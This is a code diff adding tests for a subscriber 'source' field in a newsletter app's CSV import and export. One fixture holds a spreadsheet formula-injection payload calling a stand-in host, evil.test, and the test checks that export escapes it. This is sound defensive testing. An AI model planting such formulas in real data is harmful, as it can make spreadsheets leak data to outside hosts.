@@ -386,6 +386,62 @@ describe('POST import', () => {
       error: 'CSV must have an "email" column.',
     })
   })
+
+  it('stores a provided source on new rows, csv_import when the cell is blank', async () => {
+    await signInAsAdmin()
+    const res = await importPost(
+      importRequest(
+        'email,source\n' +
+          'a@example.com,https://example.org/\n' +
+          'b@example.com,\n'
+      )
+    )
+    expect(await res.json()).toEqual({
+      created: 2,
+      updated: 0,
+      skipped: 0,
+      total: 2,
+    })
+
+    expect((await subscriberByEmail('a@example.com')).source).toBe(
+      'https://example.org/'
+    )
+    expect((await subscriberByEmail('b@example.com')).source).toBe('csv_import')
+  })
+
+  it('backfills source on csv_import rows but never overwrites a captured referrer', async () => {
+    await signInAsAdmin()
+    await seedSubscriber({
+      email: 'imported@example.com',
+      source: 'csv_import',
+      subscribedWorkshop: false,
+    })
+    await seedSubscriber({
+      email: 'organic@example.com',
+      source: 'https://news.ycombinator.com/',
+    })
+
+    const res = await importPost(
+      importRequest(
+        'email,source\n' +
+          'imported@example.com,https://example.org/\n' +
+          'organic@example.com,https://example.org/\n'
+      )
+    )
+    expect(await res.json()).toEqual({
+      created: 0,
+      updated: 2,
+      skipped: 0,
+      total: 2,
+    })
+
+    const imported = await subscriberByEmail('imported@example.com')
+    expect(imported.source).toBe('https://example.org/')
+    expect(imported.subscribedWorkshop).toBe(false) // opt-out preserved
+
+    const organic = await subscriberByEmail('organic@example.com')
+    expect(organic.source).toBe('https://news.ycombinator.com/')
+  })
 })
 
 describe('GET export', () => {
@@ -394,11 +450,13 @@ describe('GET export', () => {
     await seedSubscriber({
       email: '=cmd@example.com',
       name: '=SUM(A1:A2)',
+      source: '=IMPORTXML("http://evil.test","//a")',
       confirmedAt: new Date(),
     })
     await seedSubscriber({
       email: 'plain@example.com',
       name: 'Plain Name',
+      source: 'https://example.org/',
       subscribedPostcard: false,
     })
 
@@ -417,6 +475,7 @@ describe('GET export', () => {
       'contraption',
       'workshop',
       'confirmed',
+      'source',
       'created_at',
     ])
     const data = parsed.slice(1)
@@ -427,20 +486,23 @@ describe('GET export', () => {
     expect(data[0][1]).toBe('Plain Name')
     expect(data[0][2]).toBe('false')
     expect(data[0][5]).toBe('false')
+    expect(data[0][6]).toBe('https://example.org/')
 
-    // Untrusted cells starting with '=' get a leading apostrophe.
+    // Untrusted cells starting with '=' get a leading apostrophe — source is
+    // attacker-influenced (it comes from document.referrer).
     expect(data[1][0]).toBe("'=cmd@example.com")
     expect(data[1][1]).toBe("'=SUM(A1:A2)")
     expect(data[1][5]).toBe('true')
+    expect(data[1][6]).toBe(`'=IMPORTXML("http://evil.test","//a")`)
   })
 
-  it('import -> export -> import round-trip preserves flags without creating rows', async () => {
+  it('import -> export -> import round-trip preserves flags and sources without creating rows', async () => {
     await signInAsAdmin()
     await importPost(
       importRequest(
-        'email,name,postcard,contraption,workshop,confirmed\n' +
-          'rt1@example.com,One,true,false,true,true\n' +
-          'rt2@example.com,,false,true,false,false\n'
+        'email,name,postcard,contraption,workshop,confirmed,source\n' +
+          'rt1@example.com,One,true,false,true,true,https://example.org/\n' +
+          'rt2@example.com,,false,true,false,false,\n'
       )
     )
 
@@ -459,6 +521,7 @@ describe('GET export', () => {
     expect(rt1.subscribedContraption).toBe(false)
     expect(rt1.subscribedWorkshop).toBe(true)
     expect(rt1.confirmedAt).not.toBeNull()
+    expect(rt1.source).toBe('https://example.org/')
 
     const rt2 = await subscriberByEmail('rt2@example.com')
     expect(rt2.name).toBeNull()
@@ -466,5 +529,6 @@ describe('GET export', () => {
     expect(rt2.subscribedContraption).toBe(true)
     expect(rt2.subscribedWorkshop).toBe(false)
     expect(rt2.confirmedAt).toBeNull()
+    expect(rt2.source).toBe('csv_import')
   })
 })
